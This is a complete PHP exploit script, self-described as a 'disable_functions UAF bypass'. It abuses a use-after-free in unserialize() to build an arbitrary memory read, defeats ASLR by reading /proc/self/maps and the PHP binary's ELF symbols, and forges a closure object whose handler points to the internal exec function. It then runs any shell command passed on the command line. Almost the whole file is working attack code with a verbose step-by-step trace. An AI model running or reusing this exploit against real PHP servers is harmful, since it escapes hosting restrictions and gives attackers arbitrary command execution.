<?php

declare(strict_types=0);
error_reporting(0);
// ── Zval / object layout constants ──────────────────────────────────────────
const TI_LONG   = 0x00000004;
const TI_STRING = 0x00000006;  // IS_STRING, non-refcounted (safe for probing)
const TI_OBJECT = 0x00000308;  // IS_OBJECT | IS_TYPE_REFCOUNTED | IS_TYPE_COLLECTABLE
const GC_OBJECT = 0x00000018;  // type_info for zend_object gc header (IS_OBJECT|collectable)
const ZEND_ACC_CLOSURE   = 0x400000;
const ZSTR_HDR           = 24;   // sizeof zend_string header (gc+h+len)
const ZOBJ_HDR           = 56;   // sizeof zend_object (gc+handle+extra+ce+hdl+props+table[])
const OBJ_CE_OFF         = 16;   // offsetof(zend_object, ce)
const OBJ_HDL_OFF        = 24;   // offsetof(zend_object, handlers)
// NOTE: CE_HDL_OFF and HDL_FREE_OBJ_OFF are intentionally absent.
// The exploit reads .ce and .handlers directly off $tmp_clo's zend_object
// (via arb_read64), so we never need to dereference through zend_class_entry.
const ZFUNC_HANDLER_OFF  = 88;   // offsetof(zend_internal_function, handler)
const SCAN_STRIDE        = 64;   // covers all bin sizes (min PHP allocation alignment)
const SCAN_STEPS_PER_PAGE = 64;  // PAGE_SIZE / SCAN_STRIDE
const PAGE_SIZE          = 4096;
// ── Zval / memory write helpers ───────────────────────────────────────────────
function wz(string &$s, int $off, int $val, int $ti): void {
    for ($i = 0; $i < 8; $i++) $s[$off+$i]    = chr(($val >> ($i*8)) & 0xff);
    for ($i = 0; $i < 4; $i++) $s[$off+8+$i]  = chr(($ti  >> ($i*8)) & 0xff);
    for ($i = 0; $i < 4; $i++) $s[$off+12+$i] = "\x00";
}
function w64(string &$s, int $off, int $v): void {
    for ($i = 0; $i < 8; $i++) $s[$off+$i] = chr(($v >> ($i*8)) & 0xff);
}
function w32(string &$s, int $off, int $v): void {
    for ($i = 0; $i < 4; $i++) $s[$off+$i] = chr(($v >> ($i*8)) & 0xff);
}

function arb_read64(int $addr, string &$s0): int {
    wz($s0, 40, $addr - 16, TI_STRING);
    $r = @unserialize('R:4;');
    return is_string($r) ? strlen($r) : 0;
}
// ── ELF file helpers ─────────────────────────────────────────────────────────
function elf_sections(string $e): array {
    if (strlen($e) < 64 || substr($e, 0, 4) !== "\x7fELF") return [];
    $shoff     = unpack('Q', substr($e, 40, 8))[1];
    $shentsize = unpack('v', substr($e, 58, 2))[1];
    $shnum     = unpack('v', substr($e, 60, 2))[1];
    $shstrndx  = unpack('v', substr($e, 62, 2))[1];
    if (!$shoff || $shentsize < 64) return [];
    $secs = [];
    for ($i = 0; $i < $shnum; $i++) {
        $s = substr($e, $shoff + $i * $shentsize, 64);
        if (strlen($s) < 64) continue;
        $secs[] = [
            'name_off' => unpack('V', substr($s, 0, 4))[1],
            'type'     => unpack('V', substr($s, 4, 4))[1],
            'flags'    => unpack('Q', substr($s, 8, 8))[1],
            'off'      => unpack('Q', substr($s, 24, 8))[1],
            'size'     => unpack('Q', substr($s, 32, 8))[1],
            'link'     => unpack('V', substr($s, 40, 4))[1],
            'entsize'  => unpack('Q', substr($s, 56, 8))[1],
        ];
    }
    if (!$secs || !isset($secs[$shstrndx])) return [];
    $shstrtab = substr($e, $secs[$shstrndx]['off'], $secs[$shstrndx]['size']);
    $named = [];
    foreach ($secs as $sec) {
        $nm = substr($shstrtab, $sec['name_off']);
        $nm = strstr($nm, "\x00", true) ?: $nm;
        $named[$nm] = $sec;
    }
    return $named;
}
function elf_sym(string $e, array $secs, string $tab, string $str, string $name): int {
    if (!isset($secs[$tab], $secs[$str])) return 0;
    $symtab = substr($e, $secs[$tab]['off'], $secs[$tab]['size']);
    $strtab = substr($e, $secs[$str]['off'], $secs[$str]['size']);
    $es = (int)$secs[$tab]['entsize'];
    if ($es < 24) $es = 24;
    for ($i = 0; $i < strlen($symtab) - $es + 1; $i += $es) {
        $nm_off = unpack('V', substr($symtab, $i, 4))[1];
        $nm = substr($strtab, $nm_off);
        $nm = strstr($nm, "\x00", true) ?: $nm;
        if ($nm === $name) return unpack('Q', substr($symtab, $i + 8, 8))[1];
    }
    return 0;
}

function find_zif_exec_in_elf(string $e): int {
    if (strlen($e) < 64 || substr($e, 0, 4) !== "\x7fELF") return 0;
    $phoff     = unpack('Q', substr($e, 32, 8))[1];
    $phentsize = unpack('v', substr($e, 54, 2))[1];
    $phnum     = unpack('v', substr($e, 56, 2))[1];
    $loads = [];
    for ($i = 0; $i < $phnum; $i++) {
        $ph = substr($e, $phoff + $i * $phentsize, $phentsize);
        if (strlen($ph) < 48) continue;
        if (unpack('V', substr($ph, 0, 4))[1] !== 1) continue;  
        $p_offset = unpack('Q', substr($ph, 8, 8))[1];
        $p_vaddr  = unpack('Q', substr($ph, 16, 8))[1];
        $p_filesz = unpack('Q', substr($ph, 32, 8))[1];
        $loads[]  = [$p_vaddr, $p_offset, $p_filesz];
    }
    $vma_to_off = function(int $vma) use ($loads): int {
        foreach ($loads as [$va, $fo, $sz]) {
            if ($vma >= $va && $vma < $va + $sz) return $fo + ($vma - $va);
        }
        return 0;
    };
    foreach ($loads as [$va, $fo, $sz]) {
        if ($sz < 32) continue;
        $seg = substr($e, $fo, $sz);
        for ($off = 0; $off < strlen($seg) - 24; $off += 8) {
            $fname_vma = unpack('Q', substr($seg, $off, 8))[1];
            if ($fname_vma < 0x1000 || $fname_vma > 0x10000000) continue;
            $foff = $vma_to_off($fname_vma);
            if (!$foff || $foff + 8 > strlen($e)) continue;
            if (substr($e, $foff, 5) !== "exec\x00") continue;
            $handler_vma = unpack('Q', substr($seg, $off + 8, 8))[1];
            if ($handler_vma < 0x1000 || $handler_vma > 0x10000000) continue;
            $na = unpack('v', substr($seg, $off + 24, 2))[1];
            if ($na === 3) return $handler_vma;
        }
    }
    return 0;
}

function parse_maps(): array {
    $result = ['chunks' => [], 'binary_base' => 0, 'binary_lo' => 0, 'binary_hi' => 0];
    $cm = @file_get_contents('/proc/self/maps');
    if (!$cm) return $result;
    $self_exe = @readlink('/proc/self/exe') ?: PHP_BINARY;
    foreach (explode("\n", $cm) as $cl) {
        if (!trim($cl)) continue;
        $cp   = preg_split('/\s+/', trim($cl), 6);
        if (count($cp) < 5) continue;
        [$cs2, $ce2] = explode('-', $cp[0]);
        $cs   = hexdec($cs2); $ce = hexdec($ce2); $csz = $ce - $cs;
        $foff = hexdec($cp[2]);
        $perms = $cp[1];
        $nm   = trim($cp[5] ?? '');

        $is_anon = ($nm === '' || $nm === '[heap]'
                   || str_starts_with($nm, '[anon:') || str_starts_with($nm, '[anon '));
        if ($is_anon && $csz >= 0x80000 && str_contains($perms, 'r') && str_contains($perms, 'w')) {
          
            $result['chunks'][] = [$cs, $ce];
        }
        if ($self_exe && $nm === $self_exe) {
            if ($foff === 0 && !$result['binary_base']) $result['binary_base'] = $cs;
            if (!$result['binary_lo'] || $cs < $result['binary_lo']) $result['binary_lo'] = $cs;
            if ($ce > $result['binary_hi']) $result['binary_hi'] = $ce;
        }
    }
    return $result;
}
class G implements Serializable {
    public function serialize(): string { return ''; }
    public function unserialize(string $data): void {
        global $g_exec_vma, $g_alloc_base, $g_result, $g_cmd;
        global $g_binary_base, $g_live_chunks;
        global $g_actual_ce, $g_clo_h_addr;
        global $g_attempt;
        $attempt = $g_attempt;
        $cmd     = $g_cmd;
        $V = function(string $s) { fwrite(STDERR, $s . "\n"); };
        $V("[attempt $attempt] ────────────────────────────────────────────");
        $obj = @unserialize($data, ['allowed_classes' => ['stdClass']]);
        $obj->e5 = 'E5'; $obj->e6 = 'E6'; $obj->e7 = 'E7'; $obj->e8 = 'E8';
        $s0 = str_repeat("\x00", 263);
        wz($s0, 40, 0xdeadbeef, TI_LONG);
        $got = @unserialize('R:4;');
        if ($got !== 0xdeadbeef) {
            $V("[A] FAIL  UAF primitive dead (got " . var_export($got, true) . ")");
            return;
        }
        $V("[A] OK    IS_LONG UAF → 0xdeadbeef");
        $live_chunks = $g_live_chunks;
        if (!$live_chunks) { $V("[B] FAIL  no live heap regions"); return; }
        $found = false;
        foreach ($live_chunks as [$chunk_start, $chunk_end]) {
            for ($addr = $chunk_start + PAGE_SIZE;
                 $addr < $chunk_end - SCAN_STRIDE && !$found;
                 $addr += PAGE_SIZE) {
                for ($st = 0; $st < SCAN_STEPS_PER_PAGE && !$found; $st++) {
                    $cand = $addr + $st * SCAN_STRIDE;
                    if ($cand + 32 > $chunk_end) break;
                    wz($s0, 40, $cand, TI_STRING);
                    $r = @unserialize('R:4;');
                    if (!is_string($r) || strlen($r) !== 263) continue;
                    wz($s0, 40, $cand + 8, TI_STRING);
                    $r2 = @unserialize('R:4;');
                    if (is_string($r2) && strlen($r2) === 0) {
                        $g_alloc_base = $cand;
                        $found = true;
                    }
                }
            }
        }
        if (!$g_alloc_base) { $V("[C] FAIL  alloc_base not found"); return; }
        $alloc_base = $g_alloc_base;
        $ab_chunk   = 0; $ab_chunk_end = 0;
        foreach ($live_chunks as [$cs, $ce]) {
            if ($alloc_base >= $cs && $alloc_base < $ce) { $ab_chunk = $cs; $ab_chunk_end = $ce; break; }
        }
        $ab_page = ($alloc_base - $ab_chunk) >> 12;
        $ab_st   = (($alloc_base - $ab_chunk) & 0xFFF) >> 6;
        $V(sprintf("[C] OK    alloc_base  = 0x%x", $alloc_base));
        $V(sprintf("          in region   [0x%x – 0x%x)  page=%d  stride=%d",
            $ab_chunk, $ab_chunk_end, $ab_page, $ab_st));
        $V(sprintf('          $s0 layout  zend_string hdr 24B @ 0x%x', $alloc_base));
        wz($s0, 40, $alloc_base, TI_STRING);
        $sv = @unserialize('R:4;');
        if (!is_string($sv) || strlen($sv) !== 263) {
            $V("[D] FAIL  arb_read self-test (got len=" . (is_string($sv) ? strlen($sv) : 'non-string') . ")");
            return;
        }
        $V("[D] OK    arb_read64(alloc_base) → len=263");
        if (!$g_actual_ce) {
            $tmp_clo    = static function(){};
            $tmp_handle = spl_object_id($tmp_clo);
            $V(sprintf("[E]       tmp_clo handle=%d  scanning %d region(s) ...",
                $tmp_handle, count($live_chunks)));
            $obj_seen = 0;
            foreach ($live_chunks as [$rlo, $rhi]) {
                if ($g_actual_ce) break;
                for ($addr = $rlo + PAGE_SIZE;
                     $addr < $rhi - SCAN_STRIDE && !$g_actual_ce;
                     $addr += PAGE_SIZE) {
                    for ($st = 0; $st < SCAN_STEPS_PER_PAGE && !$g_actual_ce; $st++) {
                        $cand = $addr + $st * SCAN_STRIDE;
                        if ($cand === $alloc_base || $cand + 32 > $rhi) continue;
                        $gc_v      = arb_read64($cand, $s0);
                        $type_info = ($gc_v >> 32) & 0xFFFFFFFF;
                        $refcount  = $gc_v & 0xFFFFFFFF;
                        if (($type_info & 0x0F) !== 8) continue;
                        if ($refcount === 0 || $refcount > 65536) continue;
                        $obj_seen++;
                        $hndl_v = arb_read64($cand + 8, $s0);
                        $h      = $hndl_v & 0xFFFFFFFF;
                        if ($h !== $tmp_handle) continue;
                        $ce_c = arb_read64($cand + OBJ_CE_OFF,  $s0);
                        $h_c  = arb_read64($cand + OBJ_HDL_OFF, $s0);
                        if ($ce_c < 0x10000 || $h_c < 0x10000) continue;
                        $clo_pg = ($cand - $rlo) >> 12;
                        $V(sprintf("[E] OK    tmp_clo zend_object @ 0x%x", $cand));
                        $V(sprintf("          region [0x%x – 0x%x)  page=%d", $rlo, $rhi, $clo_pg));
                        $V(sprintf("          gc.type_info = 0x%x  refcount = %d  handle = %d",
                            $type_info, $refcount, $h));
                        $V(sprintf("          .ce       = 0x%x  (zend_ce_closure)", $ce_c));
                        $V(sprintf("          .handlers = 0x%x  (closure_handlers)", $h_c));
                        $g_actual_ce  = $ce_c;
                        $g_clo_h_addr = $h_c;
                    }
                }
            }
            if (!$g_actual_ce)
                $V(sprintf("[E] FAIL  handle=%d not found (%d objects seen)", $tmp_handle, $obj_seen));
            unset($tmp_clo);
        } else {
            $V(sprintf("[E] SKIP  actual_ce cached from earlier attempt"));
        }
        if (!$g_actual_ce) return;
        $actual_ce  = $g_actual_ce;
        $clo_h_addr = $g_clo_h_addr;
        if (!$g_binary_base || !$g_exec_vma) {
            $V("[F] FAIL  binary_base or exec_vma is zero");
            return;
        }
        $zif_exec = $g_binary_base + $g_exec_vma;
        $V(sprintf("[F] OK    binary_base = 0x%x  (ASLR load address of PHP binary)", $g_binary_base));
        $V(sprintf("          exec_vma    = 0x%x  (zif_exec offset from ELF file scan)", $g_exec_vma));
        $V(sprintf("          zif_exec    = 0x%x + 0x%x = 0x%x", $g_binary_base, $g_exec_vma, $zif_exec));
        $fo      = 56;
        $fof     = $fo + ZOBJ_HDR;
        $fake_obj = $alloc_base + ZSTR_HDR + $fo;
        $V(sprintf('[G]       $s0 buffer @ 0x%x  len=263', $alloc_base));
        $V(sprintf("          fake zend_object        @ 0x%x  (alloc_base + ZSTR_HDR(%d) + %d)",
            $fake_obj, ZSTR_HDR, $fo));
        $V(sprintf("          fake zend_internal_func @ 0x%x  (fake_obj + ZOBJ_HDR(%d))",
            $fake_obj + ZOBJ_HDR, ZOBJ_HDR));
        for ($i = $fo; $i < min($fof + ZFUNC_HANDLER_OFF + 16, 263); $i++) $s0[$i] = "\x00";
        w32($s0, $fo +  0, 50);
        w32($s0, $fo +  4, GC_OBJECT);
        w64($s0, $fo + OBJ_CE_OFF,  $actual_ce);
        w64($s0, $fo + OBJ_HDL_OFF, $clo_h_addr);
        $s0[$fof] = "\x01";
        w32($s0, $fof +  4, ZEND_ACC_CLOSURE);
        w32($s0, $fof + 32, 1);
        w32($s0, $fof + 36, 1);
        w64($s0, $fof + ZFUNC_HANDLER_OFF, $zif_exec);
        $V(sprintf("[G] OK    forged zend_object:"));
        $V(sprintf("          .gc.refcount = 50  .gc.type_info = 0x%x (GC_OBJECT)", GC_OBJECT));
        $V(sprintf("          .ce       → 0x%x", $actual_ce));
        $V(sprintf("          .handlers → 0x%x", $clo_h_addr));
        $V(sprintf("          forged zend_internal_function:"));
        $V(sprintf("          .type = 0x01 (ZEND_INTERNAL_FUNCTION)"));
        $V(sprintf("          .fn_flags = 0x%x (ZEND_ACC_CLOSURE)", ZEND_ACC_CLOSURE));
        $V(sprintf("          .handler[+%d] → 0x%x  (zif_exec)", ZFUNC_HANDLER_OFF, $zif_exec));
        wz($s0, 40, $fake_obj, TI_OBJECT);
        $fake = @unserialize('R:4;');
        if (!is_object($fake)) { $V("[H] FAIL  R:4; did not return an object"); return; }
        $V(sprintf("[H]       R:4; → object @ 0x%x — calling \$fake(\"%s\") ...", $fake_obj, $cmd));
        $g_result = @$fake($cmd);
        $V(sprintf("[H] OK    exec() returned: %s", var_export($g_result, true)));
    }
}
ini_set('memory_limit', '512M');
$cmd = $argv[1] ?? 'id';
fwrite(STDERR, str_repeat('═', 68) . "\n");
fwrite(STDERR, " PHP disable_functions UAF bypass — verbose trace\n");
fwrite(STDERR, str_repeat('═', 68) . "\n");
fwrite(STDERR, sprintf(" PHP %s  (version_id=%d)  PID=%d\n", PHP_VERSION, PHP_VERSION_ID, getmypid()));
fwrite(STDERR, sprintf(" cmd: %s\n", $cmd));
fwrite(STDERR, str_repeat('─', 68) . "\n");
$_maps         = parse_maps();
$g_binary_base = $_maps['binary_base'];
$g_live_chunks = $_maps['chunks'];
fwrite(STDERR, sprintf("[maps] binary_base = 0x%x\n", $g_binary_base));
fwrite(STDERR, sprintf("[maps] %d heap region(s) found:\n", count($g_live_chunks)));
foreach ($g_live_chunks as $i => [$cs, $ce]) {
    fwrite(STDERR, sprintf("       [%d]  0x%x – 0x%x  (%dKB)\n", $i, $cs, $ce, ($ce - $cs) >> 10));
}
$g_exec_vma = 0;
{
    $elf = @file_get_contents('/proc/self/exe');
    if (!$elf || strlen($elf) < 64) $elf = @file_get_contents(PHP_BINARY);
    if ($elf && strlen($elf) >= 64) {
        $secs     = elf_sections($elf);
        $exec_vma = ($secs ? elf_sym($elf, $secs, '.symtab', '.strtab', 'zif_exec') : 0)
                    ?: find_zif_exec_in_elf($elf);
        $src      = ($secs && elf_sym($elf, $secs, '.symtab', '.strtab', 'zif_exec'))
                    ? '.symtab' : 'data-segment scan';
        if ($exec_vma) $g_exec_vma = $exec_vma;
        unset($elf, $secs, $exec_vma);
    }
}
fwrite(STDERR, sprintf("[elf]  exec_vma    = 0x%x  (via %s)\n", $g_exec_vma, $src ?? 'data-segment scan'));
fwrite(STDERR, sprintf("[elf]  zif_exec    = binary_base + exec_vma = 0x%x\n",
    $g_binary_base + $g_exec_vma));
fwrite(STDERR, str_repeat('─', 68) . "\n");
$g_alloc_base = 0;
$g_actual_ce  = 0;
$g_clo_h_addr = 0;
$g_result     = null;
$g_cmd        = $cmd;
$g_attempt    = 0;
$inner = 'O:8:"stdClass":5:{s:2:"p0";s:2:"v0";s:2:"p1";s:2:"v1";'
       . 's:2:"p2";s:2:"v2";s:2:"p3";s:2:"v3";s:2:"p4";s:2:"v4";}';
$outer = 'a:1:{i:0;C:1:"G":' . strlen($inner) . ':{' . $inner . '}}';
for ($g_attempt = 0; $g_attempt < 20 && $g_result === null; $g_attempt++) {
    $g_alloc_base = 0;
    @unserialize($outer, ['allowed_classes' => ['G', 'stdClass']]);
}
fwrite(STDERR, str_repeat('─', 68) . "\n");
if ($g_result !== null) {
    fwrite(STDERR, "[+] BYPASS OK after attempt $g_attempt\n");
    fwrite(STDERR, str_repeat('═', 68) . "\n");
    echo "BYPASS OK: $g_result\n";
    exit(0);
} else {
    fwrite(STDERR, "[!] BYPASS FAILED after $g_attempt attempts\n");
    fwrite(STDERR, sprintf("    binary_base=0x%x exec_vma=0x%x actual_ce=0x%x clo_h=0x%x\n",
        $g_binary_base, $g_exec_vma, $g_actual_ce, $g_clo_h_addr));
    fwrite(STDERR, str_repeat('═', 68) . "\n");
    exit(1);
}
